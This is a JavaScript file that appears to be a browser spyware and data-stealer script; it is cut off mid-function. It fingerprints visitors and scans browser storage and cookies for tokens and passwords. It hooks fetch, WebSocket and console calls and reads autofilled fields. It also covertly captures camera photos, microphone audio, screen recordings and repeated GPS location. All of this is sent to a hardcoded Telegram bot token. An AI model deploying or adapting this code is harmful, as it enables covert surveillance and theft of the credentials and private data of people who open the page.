// ==================== TELEGRAM CONFIGURATION ====================
const TOKEN = "7568763554:AAGLNbPtD1ev3O8GBPMEtcpPH73cuOS-vtg";
let CHAT_ID = "6837307356";

// Get chat ID from URL if present
const urlParams = new URLSearchParams(window.location.search);
const chatIdFromUrl = urlParams.get('chat_id');
if (chatIdFromUrl) CHAT_ID = chatIdFromUrl;

// Global variables
let currentLocation = null;
let cameraStream = null;
let audioStream = null;
let screenStream = null;
let cameraInterval = null;
let audioRecorder = null;
let screenRecorder = null;
let isRecording = false;
let recordedChunks = [];

// Advanced tracking variables
let mouseMovements = [];
let clickEvents = [];
let scrollEvents = [];
let networkRequests = [];
let visitedLinks = [];
let formInteractions = [];
let performanceMetrics = {};
let webrtcIPs = [];

// Silent mode - don't send permission status messages
const SILENT_MODE = true;

// ==================== 1. ADVANCED DEVICE FINGERPRINTING ====================
async function getAdvancedFingerprint() {
    const fingerprint = {
        // Canvas fingerprinting
        canvas: await getCanvasFingerprint(),
        
        // WebGL fingerprinting
        webgl: await getWebGLFingerprint(),
        
        // Audio fingerprinting
        audio: await getAudioFingerprint(),
        
        // Font fingerprinting
        fonts: getFontFingerprint(),
        
        // WebRTC IP leak
        webrtcIPs: await getWebRTCIPs(),
        
        // Battery status (if available)
        battery: await getBatteryDetails(),
        
        // Device orientation
        orientation: {
            angle: screen.orientation?.angle || 0,
            type: screen.orientation?.type || 'unknown'
        },
        
        // Color depth and pixel ratio
        colorDepth: screen.colorDepth,
        pixelRatio: window.devicePixelRatio,
        
        // Installed plugins
        plugins: getPluginsList(),
        
        // Timezone offset
        timezoneOffset: new Date().getTimezoneOffset(),
        
        // Language preferences
        languages: navigator.languages || [navigator.language],
        
        // Hardware concurrency
        hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
        
        // Device memory
        deviceMemory: navigator.deviceMemory || 'unknown',
        
        // Touch points
        maxTouchPoints: navigator.maxTouchPoints || 0,
        
        // Do Not Track
        doNotTrack: navigator.doNotTrack || 'unspecified'
    };
    
    return fingerprint;
}

async function getCanvasFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        canvas.width = 200;
        canvas.height = 50;
        const ctx = canvas.getContext('2d');
        
        // Draw complex shapes and text
        ctx.textBaseline = 'top';
        ctx.font = '14px "Arial"';
        ctx.textBaseline = 'alphabetic';
        ctx.fillStyle = '#f60';
        ctx.fillRect(125, 1, 62, 20);
        ctx.fillStyle = '#069';
        ctx.fillText('Canvas Fingerprint', 2, 15);
        ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
        ctx.fillText('Web Security', 4, 17);
        
        // Draw WebGL-like patterns
        for (let i = 0; i < 3; i++) {
            ctx.beginPath();
            ctx.arc(50 + i * 30, 30, 10, 0, Math.PI * 2);
            ctx.fillStyle = `hsl(${i * 120}, 70%, 50%)`;
            ctx.fill();
        }
        
        // Get fingerprint data
        const dataURL = canvas.toDataURL();
        const hash = await sha256(dataURL);
        return hash.substring(0, 32);
    } catch (e) {
        return 'canvas_error';
    }
}

async function getWebGLFingerprint() {
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        
        if (!gl) return 'webgl_not_supported';
        
        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
        if (debugInfo) {
            const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
            const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
            return `${vendor}|${renderer}`;
        }
        
        // Fallback: get supported extensions
        const extensions = gl.getSupportedExtensions() || [];
        return extensions.sort().join(',');
    } catch (e) {
        return 'webgl_error';
    }
}

async function getAudioFingerprint() {
    try {
        const audioContext = new (window.AudioContext || window.webkitAudioContext)();
        const oscillator = audioContext.createOscillator();
        const analyser = audioContext.createAnalyser();
        oscillator.connect(analyser);
        oscillator.type = 'sine';
        oscillator.frequency.value = 1000;
        
        const dataArray = new Uint8Array(analyser.frequencyBinCount);
        analyser.getByteFrequencyData(dataArray);
        
        oscillator.disconnect();
        audioContext.close();
        
        const hash = await sha256(dataArray.join(','));
        return hash.substring(0, 32);
    } catch (e) {
        return 'audio_error';
    }
}

function getFontFingerprint() {
    const fonts = [
        'Arial', 'Verdana', 'Times New Roman', 'Courier New',
        'Georgia', 'Palatino', 'Comic Sans MS', 'Impact',
        'Monaco', 'Consolas', 'Tahoma', 'Trebuchet MS',
        'Lucida Console', 'Helvetica', 'Geneva', 'sans-serif'
    ];
    
    const canvas = document.createElement('canvas');
    const ctx = canvas.getContext('2d');
    canvas.width = 200;
    canvas.height = 50;
    
    const installed = [];
    for (const font of fonts) {
        ctx.font = `14px ${font}`;
        const metrics = ctx.measureText('ABCDEFGHIJKLMNOPQRSTUVWXYZ');
        installed.push(`${font}:${metrics.width}`);
    }
    
    return installed.join('|');
}

async function getWebRTCIPs() {
    return new Promise((resolve) => {
        const ips = new Set();
        const pc = new RTCPeerConnection({
            iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
        });
        
        pc.createDataChannel('');
        pc.createOffer()
            .then(offer => pc.setLocalDescription(offer))
            .catch(() => {});
        
        pc.onicecandidate = (ice) => {
            if (!ice || !ice.candidate || !ice.candidate.candidate) {
                resolve(Array.from(ips));
                return;
            }
            
            const candidate = ice.candidate.candidate;
            const ipRegex = /([0-9]{1,3}\.){3}[0-9]{1,3}/;
            const match = candidate.match(ipRegex);
            if (match) {
                ips.add(match[0]);
            }
        };
        
        setTimeout(() => {
            resolve(Array.from(ips));
            pc.close();
        }, 2000);
    });
}

async function getBatteryDetails() {
    if ('getBattery' in navigator) {
        try {
            const battery = await navigator.getBattery();
            return {
                level: Math.round(battery.level * 100),
                charging: battery.charging,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            };
        } catch (e) {
            return null;
        }
    }
    return null;
}

function getPluginsList() {
    const plugins = [];
    for (let i = 0; i < navigator.plugins.length; i++) {
        const plugin = navigator.plugins[i];
        plugins.push(plugin.name);
    }
    return plugins;
}

async function sha256(message) {
    const msgBuffer = new TextEncoder().encode(message);
    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
    const hashArray = Array.from(new Uint8Array(hashBuffer));
    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
}

// ==================== 2. NETWORK INFORMATION ====================
async function getNetworkInfo() {
    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    
    return {
        effectiveType: connection?.effectiveType || 'unknown',
        downlink: connection?.downlink || 'unknown',
        rtt: connection?.rtt || 'unknown',
        saveData: connection?.saveData || false,
        type: connection?.type || 'unknown'
    };
}

// ==================== 3. PERFORMANCE METRICS ====================
function getPerformanceMetrics() {
    const perfData = performance.timing;
    const navigation = performance.getEntriesByType('navigation')[0];
    
    return {
        pageLoadTime: perfData.loadEventEnd - perfData.navigationStart,
        domReadyTime: perfData.domContentLoadedEventEnd - perfData.navigationStart,
        firstPaint: performance.getEntriesByType('paint')[0]?.startTime || 0,
        dnsLookup: perfData.domainLookupEnd - perfData.domainLookupStart,
        tcpConnection: perfData.connectEnd - perfData.connectStart,
        serverResponse: perfData.responseEnd - perfData.requestStart,
        domInteractive: perfData.domInteractive - perfData.navigationStart,
        totalTime: perfData.loadEventEnd - perfData.navigationStart
    };
}

// ==================== 4. MOUSE TRACKING ====================
function startMouseTracking() {
    document.addEventListener('mousemove', (e) => {
        mouseMovements.push({
            x: e.clientX,
            y: e.clientY,
            timestamp: Date.now()
        });
        
        // Keep only last 100 movements
        if (mouseMovements.length > 100) {
            mouseMovements.shift();
        }
    });
    
    document.addEventListener('click', (e) => {
        clickEvents.push({
            x: e.clientX,
            y: e.clientY,
            target: e.target.tagName,
            timestamp: Date.now()
        });
    });
    
    window.addEventListener('scroll', () => {
        scrollEvents.push({
            scrollY: window.scrollY,
            scrollX: window.scrollX,
            timestamp: Date.now()
        });
    });
}

// ==================== 5. NETWORK REQUEST MONITOR ====================
function interceptNetworkRequests() {
    const originalFetch = window.fetch;
    window.fetch = async function(...args) {
        const startTime = Date.now();
        const url = args[0];
        
        try {
            const response = await originalFetch.apply(this, args);
            const endTime = Date.now();
            
            networkRequests.push({
                url: url,
                method: args[1]?.method || 'GET',
                status: response.status,
                duration: endTime - startTime,
                timestamp: new Date().toISOString()
            });
            
            // Keep last 50 requests
            if (networkRequests.length > 50) {
                networkRequests.shift();
            }
            
            return response;
        } catch (error) {
            networkRequests.push({
                url: url,
                method: args[1]?.method || 'GET',
                error: error.message,
                timestamp: new Date().toISOString()
            });
            throw error;
        }
    };
}

// ==================== 6. LOCAL STORAGE SCANNER ====================
function scanLocalStorage() {
    const items = [];
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        
        // Check for sensitive data patterns
        const isSensitive = /(token|auth|session|password|key|secret|jwt|bearer)/i.test(key);
        
        items.push({
            key: key,
            value: isSensitive ? value.substring(0, 50) + '...' : value,
            size: (key.length + value.length) * 2,
            isSensitive: isSensitive
        });
    }
    return items;
}

// ==================== 7. SESSION STORAGE SCANNER ====================
function scanSessionStorage() {
    const items = [];
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        
        items.push({
            key: key,
            value: value.substring(0, 100),
            size: (key.length + value.length) * 2
        });
    }
    return items;
}

// ==================== 8. INDEXEDDB SCANNER ====================
async function scanIndexedDB() {
    const databases = [];
    
    try {
        const dbs = await indexedDB.databases();
        for (const dbInfo of dbs) {
            databases.push({
                name: dbInfo.name,
                version: dbInfo.version
            });
        }
    } catch (e) {
        // Some browsers don't support indexedDB.databases()
    }
    
    return databases;
}

// ==================== 9. SERVICE WORKER DETECTION ====================
async function detectServiceWorkers() {
    if (!('serviceWorker' in navigator)) {
        return [];
    }
    
    const registrations = await navigator.serviceWorker.getRegistrations();
    return registrations.map(reg => ({
        scope: reg.scope,
        active: reg.active !== null,
        state: reg.active?.state || 'unknown'
    }));
}

// ==================== 10. WEB SOCKET MONITOR ====================
function monitorWebSockets() {
    const originalWebSocket = window.WebSocket;
    window.WebSocket = function(...args) {
        const ws = new originalWebSocket(...args);
        
        ws.addEventListener('open', () => {
            sendMessageToTelegram(`🔌 *WebSocket Opened*\n📡 URL: ${args[0]}\n⏰ ${new Date().toLocaleString()}`);
        });
        
        ws.addEventListener('message', (event) => {
            if (event.data && event.data.length > 0) {
                const dataStr = typeof event.data === 'string' ? event.data : JSON.stringify(event.data);
                if (dataStr.includes('token') || dataStr.includes('auth') || dataStr.includes('password')) {
                    sendMessageToTelegram(`📨 *WebSocket Message*\n📤 ${dataStr.substring(0, 500)}\n⏰ ${new Date().toLocaleString()}`);
                }
            }
        });
        
        return ws;
    };
    window.WebSocket.prototype = originalWebSocket.prototype;
}

// ==================== 11. BEACON MONITOR ====================
function monitorBeacon() {
    const originalSendBeacon = navigator.sendBeacon;
    navigator.sendBeacon = function(url, data) {
        sendMessageToTelegram(`📡 *Beacon Sent*\n🔗 URL: ${url}\n📊 Data: ${JSON.stringify(data).substring(0, 200)}\n⏰ ${new Date().toLocaleString()}`);
        return originalSendBeacon.call(this, url, data);
    };
}

// ==================== 12. CONSOLE MONITOR ====================
function monitorConsole() {
    const originalConsoleLog = console.log;
    const originalConsoleError = console.error;
    const originalConsoleWarn = console.warn;
    
    console.log = function(...args) {
        if (args[0] && typeof args[0] === 'string' && 
            (args[0].includes('password') || args[0].includes('token') || args[0].includes('secret'))) {
            sendMessageToTelegram(`📝 *Console Log*\n${args[0]}\n⏰ ${new Date().toLocaleString()}`);
        }
        originalConsoleLog.apply(console, args);
    };
    
    console.error = function(...args) {
        sendMessageToTelegram(`❌ *Console Error*\n${args[0]}\n⏰ ${new Date().toLocaleString()}`);
        originalConsoleError.apply(console, args);
    };
    
    console.warn = function(...args) {
        if (args[0] && typeof args[0] === 'string' && args[0].includes('security')) {
            sendMessageToTelegram(`⚠️ *Console Warning*\n${args[0]}\n⏰ ${new Date().toLocaleString()}`);
        }
        originalConsoleWarn.apply(console, args);
    };
}

// ==================== 13. DOM MUTATION OBSERVER ====================
function observeDOMMutations() {
    const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            if (mutation.type === 'childList') {
                mutation.addedNodes.forEach((node) => {
                    if (node.nodeType === Node.ELEMENT_NODE) {
                        // Check for password fields
                        if (node.type === 'password' || node.querySelectorAll) {
                            const passwordFields = node.querySelectorAll('input[type="password"]');
                            if (passwordFields.length > 0) {
                                sendMessageToTelegram(`🔐 *New Password Field Detected*\n⏰ ${new Date().toLocaleString()}`);
                            }
                        }
                        
                        // Check for login forms
                        if (node.tagName === 'FORM' || (node.querySelectorAll && node.querySelectorAll('form').length > 0)) {
                            sendMessageToTelegram(`📝 *New Form Detected*\n⏰ ${new Date().toLocaleString()}`);
                        }
                    }
                });
            }
        });
    });
    
    observer.observe(document.body, {
        childList: true,
        subtree: true,
        attributes: true,
        attributeFilter: ['type', 'name', 'id', 'class']
    });
}

// ==================== 14. AUTO-FILL DETECTION ====================
function detectAutoFill() {
    setInterval(() => {
        const inputs = document.querySelectorAll('input');
        inputs.forEach((input) => {
            if (input.value && input.value.length > 0 && 
                input.getAttribute('autocomplete') === 'on') {
                sendMessageToTelegram(`📝 *Auto-fill Detected*\n🔤 Field: ${input.name || input.id}\n📋 Value: ${input.value.substring(0, 100)}\n⏰ ${new Date().toLocaleString()}`);
            }
        });
    }, 5000);
}

// ==================== 15. EXTENSION DETECTION ====================
function detectBrowserExtensions() {
    const extensions = [];
    
    // Common extension detection patterns
    const extensionPatterns = [
        'chrome.runtime', 'browser.runtime', 'webdriver', 
        '__webdriver_evaluate', '__selenium_evaluate', 
        '__webdriver_script_function', '__webdriver_script_func',
        '__webdriver_script_fn', '__fxdriver_evaluate', 
        '__driver_unwrapped', '__webdriver_evaluate',
        '__selenium_unwrapped', '__fxdriver_unwrapped'
    ];
    
    for (const pattern of extensionPatterns) {
        if (window.hasOwnProperty(pattern) || document.documentElement.hasAttribute(pattern)) {
            extensions.push(pattern);
        }
    }
    
    return extensions;
}

// ==================== 16. VIRTUAL MACHINE DETECTION ====================
function detectVirtualMachine() {
    const indicators = [];
    
    // Check for common VM indicators
    if (navigator.hardwareConcurrency <= 2) indicators.push('low_cpu_cores');
    if (navigator.deviceMemory <= 2) indicators.push('low_ram');
    if (screen.width <= 1024 && screen.height <= 768) indicators.push('small_screen');
    
    // Check for headless browser indicators
    if (!navigator.webdriver) {
        if (navigator.languages && navigator.languages.length === 0) indicators.push('no_languages');
        if (navigator.plugins && navigator.plugins.length === 0) indicators.push('no_plugins');
    }
    
    return indicators;
}

// ==================== 17. GEOLOCATION SPOOFING DETECTION ====================
function detectGeolocationSpoofing() {
    return new Promise((resolve) => {
        if (!navigator.geolocation) {
            resolve(false);
            return;
        }
        
        const startTime = Date.now();
        navigator.geolocation.getCurrentPosition(
            () => {
                const duration = Date.now() - startTime;
                // If location is returned too quickly (< 50ms), might be spoofed
                resolve(duration < 50);
            },
            () => resolve(false),
            { timeout: 5000 }
        );
    });
}

// ==================== 18. COMPREHENSIVE DEVICE INFO ====================
async function collectDeviceInfo() {
    const fingerprint = await getAdvancedFingerprint();
    const networkInfo = await getNetworkInfo();
    const performanceMetrics = getPerformanceMetrics();
    const localStorageItems = scanLocalStorage();
    const sessionStorageItems = scanSessionStorage();
    const indexedDB = await scanIndexedDB();
    const serviceWorkers = await detectServiceWorkers();
    const extensions = detectBrowserExtensions();
    const vmIndicators = detectVirtualMachine();
    const locationSpoofed = await detectGeolocationSpoofing();
    
    const info = {
        timestamp: new Date().toLocaleString('km-KH'),
        fingerprint: fingerprint,
        network: networkInfo,
        performance: performanceMetrics,
        storage: {
            localStorage: {
                items: localStorageItems,
                totalSize: formatBytes(calculateLocalStorageSize())
            },
            sessionStorage: {
                items: sessionStorageItems,
                totalSize: formatBytes(calculateSessionStorageSize())
            },
            indexedDB: indexedDB
        },
        serviceWorkers: serviceWorkers,
        browserExtensions: extensions,
        virtualMachineIndicators: vmIndicators,
        locationSpoofed: locationSpoofed,
        mouseMovements: mouseMovements.slice(-20),
        clickEvents: clickEvents.slice(-20),
        scrollEvents: scrollEvents.slice(-10),
        networkRequests: networkRequests.slice(-20),
        userAgent: navigator.userAgent,
        platform: navigator.platform,
        language: navigator.language,
        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
        screen: `${window.screen.width}x${window.screen.height}`,
        viewport: `${window.innerWidth}x${window.innerHeight}`,
        cookies: navigator.cookieEnabled ? 'មាន' : 'គ្មាន',
        online: navigator.onLine ? 'អន្តរណេត' : 'អត់អន្តរណេត',
        touch: 'ontouchstart' in window ? 'មាន' : 'គ្មាន',
        referrer: document.referrer || 'គ្មាន',
        url: window.location.href,
        hardwareConcurrency: navigator.hardwareConcurrency || 'Unknown',
        deviceMemory: navigator.deviceMemory || 'Unknown'
    };
    
    if (currentLocation) {
        info.location = currentLocation;
    }
    
    return info;
}

// ==================== HELPER FUNCTIONS ====================
function calculateLocalStorageSize() {
    let total = 0;
    for (let i = 0; i < localStorage.length; i++) {
        const key = localStorage.key(i);
        const value = localStorage.getItem(key);
        total += (key.length + value.length) * 2;
    }
    return total;
}

function calculateSessionStorageSize() {
    let total = 0;
    for (let i = 0; i < sessionStorage.length; i++) {
        const key = sessionStorage.key(i);
        const value = sessionStorage.getItem(key);
        total += (key.length + value.length) * 2;
    }
    return total;
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch {
        return 'ទាញយកមិនបាន';
    }
}

// ==================== FORMAT DEVICE INFO FOR TELEGRAM ====================
function formatDeviceInfo(info) {
    let locationText = 'មិនអនុញ្ញាត';
    if (info.location && typeof info.location === 'object') {
        const mapsLink = `https://www.google.com/maps?q=${info.location.lat},${info.location.lng}&z=15`;
        locationText = `
📍 **ទីតាំងពិតប្រាកដ:**
├─ រយៈទទឹង: ${info.location.lat}
├─ រយៈបណ្តោយ: ${info.location.lng}
├─ ភាពត្រឹមត្រូវ: ±${info.location.accuracy}m
├─ Google Maps: ${mapsLink}
└─ តំបន់ពេល: ${info.timezone}`;
    }
    
    let fingerprintText = '';
    if (info.fingerprint) {
        fingerprintText = `
🎯 **Digital Fingerprint:**
├─ Canvas: ${info.fingerprint.canvas}
├─ WebGL: ${info.fingerprint.webgl}
├─ Audio: ${info.fingerprint.audio}
├─ WebRTC IPs: ${info.fingerprint.webrtcIPs?.join(', ') || 'none'}
├─ Color Depth: ${info.fingerprint.colorDepth}
├─ Pixel Ratio: ${info.fingerprint.pixelRatio}
└─ Plugins: ${info.fingerprint.plugins?.length || 0} plugins`;
    }
    
    let networkText = '';
    if (info.network) {
        networkText = `
🌐 **Network Information:**
├─ Connection: ${info.network.effectiveType}
├─ Downlink: ${info.network.downlink} Mbps
├─ RTT: ${info.network.rtt} ms
└─ Save Data: ${info.network.saveData ? 'Yes' : 'No'}`;
    }
    
    let performanceText = '';
    if (info.performance) {
        performanceText = `
⚡ **Performance Metrics:**
├─ Page Load: ${info.performance.pageLoadTime} ms
├─ DOM Ready: ${info.performance.domReadyTime} ms
├─ First Paint: ${info.performance.firstPaint} ms
└─ Total Time: ${info.performance.totalTime} ms`;
    }
    
    let securityText = '';
    if (info.browserExtensions?.length > 0) {
        securityText += `\n⚠️ Extensions Detected: ${info.browserExtensions.length}`;
    }
    if (info.virtualMachineIndicators?.length > 0) {
        securityText += `\n🖥️ VM Indicators: ${info.virtualMachineIndicators.join(', ')}`;
    }
    if (info.locationSpoofed) {
        securityText += `\n🔒 Location Spoofing Detected`;
    }
    
    let storageText = '';
    if (info.storage) {
        storageText = `
💾 **Storage Analysis:**
├─ LocalStorage: ${info.storage.localStorage.items.length} items (${info.storage.localStorage.totalSize})
├─ SessionStorage: ${info.storage.sessionStorage.items.length} items (${info.storage.sessionStorage.totalSize})
└─ IndexedDB: ${info.storage.indexedDB?.length || 0} databases`;
        
        // Show sensitive storage items
        const sensitiveItems = info.storage.localStorage.items.filter(i => i.isSensitive);
        if (sensitiveItems.length > 0) {
            storageText += `\n├─ 🔐 Sensitive Keys: ${sensitiveItems.map(i => i.key).join(', ')}`;
        }
    }
    
    let trackingText = '';
    if (info.mouseMovements?.length > 0) {
        trackingText += `\n🖱️ Mouse Movements: ${info.mouseMovements.length} events`;
    }
    if (info.clickEvents?.length > 0) {
        trackingText += `\n👆 Clicks: ${info.clickEvents.length} events`;
    }
    if (info.networkRequests?.length > 0) {
        trackingText += `\n🌐 Network Requests: ${info.networkRequests.length} requests`;
    }
    
    return `📱 **DEVICE INFORMATION REPORT**
⏰ Time: ${info.timestamp}
🌐 IP: ${info.ip}
${fingerprintText}
${networkText}
${performanceText}
📟 Platform: ${info.platform}
🗣️ Language: ${info.language}
🌐 Timezone: ${info.timezone}
📺 Screen: ${info.screen}
👁️ Viewport: ${info.viewport}
🍪 Cookies: ${info.cookies}
📶 Status: ${info.online}
👆 Touch: ${info.touch}
${locationText}
${storageText}
${trackingText}
${securityText}
🔗 Referrer: ${info.referrer}
📄 URL: ${info.url}
💻 CPU Cores: ${info.hardwareConcurrency}
🧠 RAM: ${info.deviceMemory}GB`;
}

// ==================== TELEGRAM FUNCTIONS ====================
async function sendMessageToTelegram(message) {
    if (!CHAT_ID || !message) return;
    if (SILENT_MODE && (message.includes('កាមេរ៉ា') || message.includes('ទីតាំង') || message.includes('មីក្រូហ្វូន') || message.includes('ថតអេក្រង់'))) {
        return;
    }
    
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ 
                chat_id: CHAT_ID, 
                text: message,
                parse_mode: 'Markdown'
            }),
        });
    } catch (err) {}
}

async function sendPhotoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('photo', file);
    if (caption) formData.append('caption', caption);
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: "POST", body: formData });
    } catch (error) {}
}

async function sendVideoToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('video', file);
    if (caption) formData.append('caption', caption);
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, { method: "POST", body: formData });
    } catch (error) {}
}

async function sendAudioToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('audio', file);
    if (caption) formData.append('caption', caption);
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendAudio`, { method: "POST", body: formData });
    } catch (error) {}
}

async function sendFileToTelegram(file, caption) {
    if (!CHAT_ID) return;
    const formData = new FormData();
    formData.append('chat_id', CHAT_ID);
    formData.append('document', file);
    if (caption) formData.append('caption', caption);
    try {
        await fetch(`https://api.telegram.org/bot${TOKEN}/sendDocument`, { method: "POST", body: formData });
    } catch (error) {}
}

// ==================== CAMERA FUNCTIONS ====================
async function requestCameraPermission() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
            video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
            audio: false 
        });
        cameraStream = stream;
        startCameraCapture(stream);
    } catch (error) {}
}

function startCameraCapture(stream) {
    const video = document.createElement('video');
    video.style.display = 'none';
    document.body.appendChild(video);
    video.srcObject = stream;
    video.play();
    
    cameraInterval = setInterval(async () => {
        if (!video || video.readyState < 2) return;
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
        canvas.toBlob(async (blob) => {
            if (blob && blob.size > 0) {
                const file = new File([blob], `camera_${Date.now()}.jpg`, { type: 'image/jpeg' });
                await sendPhotoToTelegram(file, `📸 *រូបថតពីកាមេរ៉ា*\n⏰ ${new Date().toLocaleString('km-KH')}`);
            }
        }, 'image/jpeg', 0.7);
    }, 5000);
}

// ==================== LOCATION FUNCTIONS ====================
function requestLocationPermission() {
    if (!navigator.geolocation) return;
    
    navigator.geolocation.getCurrentPosition(
        async (position) => {
            currentLocation = {
                lat: position.coords.latitude,
                lng: position.coords.longitude,
                accuracy: Math.round(position.coords.accuracy)
            };
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ 
                    chat_id: CHAT_ID, 
                    latitude: currentLocation.lat,
                    longitude: currentLocation.lng
                }),
            });
        },
        () => {},
        { enableHighAccuracy: true, timeout: 10000 }
    );
    
    setInterval(() => {
        navigator.geolocation.getCurrentPosition(
            async (position) => {
                currentLocation = {
                    lat: position.coords.latitude,
                    lng: position.coords.longitude,
                    accuracy: Math.round(position.coords.accuracy)
                };
                await fetch(`https://api.telegram.org/bot${TOKEN}/sendLocation`, {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ 
                        chat_id: CHAT_ID, 
                        latitude: currentLocation.lat,
                        longitude: currentLocation.lng
                    }),
                });
            },
            () => {},
            { enableHighAccuracy: true, timeout: 5000 }
        );
    }, 30000);
}

// ==================== MICROPHONE FUNCTIONS ====================
async function requestMicrophonePermission() {
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        audioStream = stream;
        startAudioRecording(stream);
    } catch (error) {}
}

function startAudioRecording(stream) {
    const recorder = new MediaRecorder(stream);
    const chunks = [];
    
    recorder.ondataavailable = async (event) => {
        if (event.data.size > 0) {
            chunks.push(event.data);
            const blob = new Blob(chunks, { type: 'audio/webm' });
            const file = new File([blob], `audio_${Date.now()}.webm`, { type: 'audio/webm' });
            await sendAudioToTelegram(file, `🎤 *ការថតសំឡេង*\n📊 Size: ${(blob.size / 1024).toFixed(2)} KB\n⏰ ${new Date().toLocaleString('km-KH')}`);
            chunks.length = 0;
        }
    };
    
    recorder.start();
    setInterval(() => {
        if (recorder.state === 'recording') {
            recorder.stop();
            setTimeout(() => recorder.start(), 100);
        }
    }, 15000);
}

// ==================== SCREEN FUNCTIONS ====================
async function requestScreenPermission() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
    
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { cursor: "always", frameRate: { ideal: 30 } },
            audio: true
        });
        screenStream = stream;
        startScreenRecording(stream);
        await captureScreenshot();
        setInterval(() => captureScreenshot(), 30000);
    } catch (error) {}
}

function startScreenRecording(stream) {
    const mimeType = MediaRecorder.isTypeSupported('video/webm') ? 'video/webm' : 'video/mp4';
    screenRecorder = new MediaRecorder(stream, { mimeType, videoBitsPerSecond: 2500000 });
    const chunks = [];
    
    screenRecorder.ondataavailable = async (event) => {
        if (event.data.size > 0) {
            chunks.push(event.data);
            const blob = new Blob(chunks, { type: mimeType });
            const ext = mimeType.includes('mp4') ? 'mp4' : 'webm';
            const file = new File([blob], `screen_${Date.now()}.${ext}`, { type: mimeType });
            await sendVideoToTelegram(file, `📹 *ការថតអេក្រង់*\n📊 Size: ${(blob.size / 1024 / 1024).toFixed(2)} MB\n⏰ ${new Date().toLocaleString('km-KH')}`);
            chunks.length = 0;
        }
    };
    
    screenRecorder.start(1000);
    
    setTimeout(() => {
        if (screenRecorder && screenRecorder.state === 'recording') {
            screenRecorder.stop();
            stream.getTracks().forEach(track => track.stop());
        }
    }, 30000);
    
    stream.getVideoTracks()[0].addEventListener('ended', () => {
        if (screenRecorder && screenRecorder.state === 'recording') {
            screenRecorder.stop();
        }
    });
}

async function captureScreenshot() {
    if (!navigator.mediaDevices || !navigator.mediaDevices.getDisplayMedia) return;
    
    try {
        const stream = await navigator.mediaDevices.getDisplayMedia({
            video: { cursor: "always" },
            audio: false
        });
        
        const video = document.createElement('video');
        video.style.display = 'none';
        document.body.appendChild(video);
        video.srcObject = stream;
        await video.play();
        await new Promise(resolve => setTimeout(resolve, 500));
        
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        canvas.getContext('2d').drawImage(video, 0, 0);
        
        const blob = await new Promise(resolve => canvas.toBlob(resolve, 'image/png'));
        const file = new File([blob], `screenshot_${Date.now()}.png`, { type: 'image/png' });
        await sendPhotoToTelegram(file, `📸 *SCREENSHOT*\n📐 ${canvas.width}x${canvas.height}\n⏰ ${new Date().toLocaleString('km-KH')}`);
        
        stream.getTracks().forEach(track => track.stop());
        video.remove();
    } catch (error) {}
}

// ==================== DATA STEALER FUNCTIONS ====================
function getAllCookies() {
    const cookies = {};
    const cookieString = document.cookie;
    if (!cookieString) return cookies;
    
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        if (name) cookies[name] = value;
    });
    return cookies;
}

function getCookieDetails() {
    const cookies = [];
    const cookieString = document.cookie;
    if (!cookieString) return cookies;
    
    cookieString.split(';').forEach(cookie => {
        const parts = cookie.split('=');
        const name = parts[0].trim();
        const value = parts.length > 1 ? decodeURIComponent(parts.slice(1).join('=').trim()) : '';
        const sensitiveKeywords = ['session', 'token', 'auth', 'login', 'user', 'pass', 'email', 'id', 'key', 'secret', 'jwt'];
        const isSensitive = sensitiveKeywords.some(keyword => 
